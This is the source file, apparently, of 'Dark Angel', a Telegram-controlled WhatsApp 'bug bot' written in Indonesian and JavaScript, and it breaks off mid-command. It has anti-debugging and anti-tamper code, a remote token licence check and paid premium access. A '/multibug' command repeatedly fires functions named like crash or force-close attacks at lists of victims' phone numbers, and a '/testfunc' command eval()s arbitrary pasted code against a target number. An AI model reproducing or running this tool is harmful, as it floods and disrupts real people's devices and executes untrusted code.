const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@bellachu/baileys");
//============( CONST ) =======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://gangalink.vercel.app/i/cxlqi2i3.mp4";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseUrl = `https://raw.githubusercontent.com/codeaja776-lgtm/Xloads/refs/heads/main/Tokens.json`
function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`━━━━━━━━━━━━━━━━━━━━━━━━━━━
   DARK ANGEL
━━━━━━━━━━━━━━━━━━━━━━━━━━
`));
console.log(chalk.bold.yellow(`
□ Owner: ZyuuOffc
□ Version: 12.0 Gen 3
□ Script: Dark Angel
□ Status: Connected`))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
  Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
      }    

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀⠀Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
//============( VALIDATE TOKEN ) =======\\
  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
  Your token not registed in database!!
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
  failed connect to server!!
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();
//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);
let tokenValidated = false;

bot.use((ctx, next) => {
  if (secureMode) return;

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("🔒 Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
━━━━━━━━━━━━━━━━━━━━━━━━━━━
   DARK ANGEL
━━━━━━━━━━━━━━━━━━━━━━━━━━━
`));
console.log(chalk.bold.yellow(`
□ Owner: ZyuuOffc
□ Version: 12.0 Gen 3
□ Script: Dark Angel 
□ Status: Connected`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`Sender Connected`))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
//============( CHECK ) =======\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

      const code = await sock.requestPairingCode(phoneNumber, "DARKVE12");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>PROSES PAIRING
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected</blockquote>`;

    const sentMsg = await ctx.replyWithVideo(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgroup -12345678 30");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delggroup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("iqc", checkPremium, async (ctx) => {
                const chatId = ctx.chat.id;
                const userId = ctx.from.id.toString();
                const args = ctx.message.text.split(" ");

               
                const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
                const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

                if (!input || !batteryInput) {  
                        return ctx.reply(  
                                "❌ Incorrect format.\n\nExample:\n/iqc ZyuuOffc,188",  
                                { parse_mode: "Markdown" }  
                        );  
                }  

                const battery = parseInt(batteryInput);
                if (isNaN(battery) || battery < 0 || battery > 100) {
                        return ctx.reply("❌ Battery must be a number between 0–100.", { parse_mode: "Markdown" });
                }

                const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');  
                const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');  
                const time = `${hours}:${minutes}`;  
                  
                const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];  
                const carrier = carriers[Math.floor(Math.random() * carriers.length)];  
                const signalStrength = Math.floor(Math.random() * 4) + 1;  

                const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;  

                try {  
                        await ctx.replyWithChatAction("upload_photo");  

                        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });    
                        const buffer = Buffer.from(response.data, "binary");    

                        await ctx.replyWithPhoto(  
                                { source: buffer },  
                                {  
                                        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,  
                                        parse_mode: "Markdown",  
                                        reply_markup: {  
                                                inline_keyboard: [  
                                                        [{ text: "Dark Angel", url: "https://t.me/INFORMASI_DARK_ANGEL" }]  
                                                ]  
                                        }  
                                }  
                        );  
                } catch (err) {  
                        console.error(err.message);  
                        ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");  
                }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const OWNER_ID = [7582105036];

bot.command('testfunc', async (ctx) => {
    const isOwner = OWNER_ID.includes(ctx.from.id);
    if (!isOwner) return ctx.reply('[ #!. ] Only for owners');

    if (!ctx.message.reply_to_message)
        return ctx.reply(
            `[ $ ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(bot, target, ctx){...}\n/testfunc 628xxxx,1`,
            { parse_mode: 'Markdown' }
        );

    const q = ctx.message.text.split(' ').slice(1).join(' ');
    if (!q)
        return ctx.reply(
            `⁉️ Missing format.\n\nExample:\n/testfunc 628xxxx,5`
        );

    let [rawTarget, rawLoop] = q.split(',');
    const number = (rawTarget || '').replace(/[^0-9]/g, '');

    if (!number) return ctx.reply('[ $ ] Invalid target number');

    const loop = Number(rawLoop) || 1;
    const target = number;

    const funcCode =
        ctx.message.reply_to_message.text ||
        ctx.message.reply_to_message.caption ||
        '';

    if (!funcCode.includes('function'))
        return ctx.reply('[ $ ] Replied message is not a function');

    let fn;
    try {
        fn = eval(`(${funcCode})`);
    } catch (e) {
        return ctx.reply(`[ $ ] Parse error:\n${e.message}`);
    }

    const context = {
        sendMessage: async (chatId, text, opts = {}) => {
            return bot.telegram.sendMessage(chatId, text, opts);
        }
    };

    await ctx.reply(
        `[ # ] *TESFUNC EXECUTION*\n\n$ Target : ${number}\n$ Loop   : ${loop}x`,
        { parse_mode: 'Markdown' }
    );

    for (let i = 0; i < loop; i++) {
        try {
            await fn(bot, target, context);
        } catch (e) {
            console.log('[TESFUNC ERROR]', e);
        }
    }

    ctx.reply('[ ! ] Done');
});

// ===== /cekfunc =====
bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "❌ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `
🟢 <b>SYNTAX CHECK: PASSED</b>

✅ <b>Status:</b> Aman, tidak ditemukan error syntax
🧠 <b>Parser:</b> Node.js V8 Engine
📦 <b>Mode:</b> Async Function Wrapper
🔐 <b>Execution:</b> Diblokir (Syntax-only)

📊 <b>Analisis Singkat:</b>
• Struktur kode valid
• Kurung & scope seimbang
• Keyword JavaScript dikenali
• Siap dieksekusi tanpa crash syntax

🚀 <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer 😎🔥
    `;

    return ctx.reply(successMsg, { parse_mode: "HTML" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `
🔴 <b>SYNTAX ERROR DETECTED</b>

❌ <b>Status:</b> Gagal parse kode
🧠 <b>Engine:</b> Node.js V8
📍 <b>Error Type:</b> ${err.name}

🧾 <b>Detail Pesan:</b>
<pre>${err.message}</pre>

🛠️ <b>Kemungkinan Penyebab:</b>
• Kurung <code>() {} []</code> tidak seimbang
• Salah penempatan <code>async / await</code>
• Typo keyword JavaScript
• Karakter ilegal / tidak tertutup

📌 <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

💀 <i>Fix it, then we talk again.</i>
    `;

    return ctx.reply(errorMsg, { parse_mode: "HTML" });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  const replyId = ctx.message.message_id;

  if (!input) {
    return ctx.reply(
      "⚠️ *Masukan URL website*\n\nContoh:\n`/trackweb https://example.com`",
      { reply_to_message_id: replyId, parse_mode: "Markdown" }
    );
  }

  let url;
  try {
    url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
  } catch {
    return ctx.reply("❌ URL tidak valid.", { reply_to_message_id: replyId });
  }

  const domain = url.hostname;

  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, {
      timeout: 10000,
      validateStatus: () => true
    });

    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";

    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";

    const output = `
🔍 *WEB TRACK RESULT*

🌐 *Domain*
${domain}

📡 *Network*
IP       : ${dnsResult.address}
Family   : IPv${dnsResult.family}

🖥 *Server*
WebSrv   : ${server}
Powered  : ${powered}
CloudFlr : ${cloudflare}

🔐 *Security*
HTTPS    : ${ssl}
Status   : ${res.status}

🧩 *Headers*
CSP      : ${headers["content-security-policy"] ? "Yes" : "No"}
HSTS     : ${headers["strict-transport-security"] ? "Yes" : "No"}
X-Frame  : ${headers["x-frame-options"] ? "Yes" : "No"}

⚠️ *Note*
• Data publik
• Aman & legal
`;

    ctx.reply(output, {
      reply_to_message_id: replyId,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal analisis website.", { reply_to_message_id: replyId });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("❌ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("🔍 Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
📡 Status: ${statusText}
📄 HTTP Code: ${res.status}
⏱ Response Time: ${ping} ms

✅ Website masih bisa diakses Jier😭🗿😌`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
🔴 Status: DOWN WKWKWK
⏱ Timeout / No Response

❌ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("multibug", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
      return ctx.reply(
        "❌ *Format salah*\n\n" +
        "📌 Contoh:\n" +
        "`/multibug 62xxx, 62xxxx, 62xxxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 *MULTI BUG STARTED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 100;
      for (let i = 0; i < loopBug; i++) {
        await sleep(1000);
        await KhasJawaForce(sock, target);
        await KhasJawaForce2(sock, target);
        await FaiqForceDelete(target);
        await sleep(1000);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ *MULTI BUG COMPLETED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT SI ANJING ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === PAKE USERBAME SI TOLOL @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Salah Tolol!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ dongo gabisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User Si hama ===
  if (!target.username) {
    return ctx.reply(
`❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
`✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

